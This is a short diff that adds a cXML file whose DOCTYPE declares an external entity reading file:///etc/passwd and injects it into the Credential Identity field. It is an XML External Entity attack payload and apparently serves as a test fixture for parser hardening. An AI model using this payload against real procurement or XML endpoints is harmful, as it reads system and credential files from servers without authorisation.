@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE cXML [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<cXML payloadID="x" timestamp="2026-11-08T10:00:00+00:00">
+  <Header><From><Credential domain="NetworkID"><Identity>&xxe;</Identity></Credential></From></Header>
+</cXML>
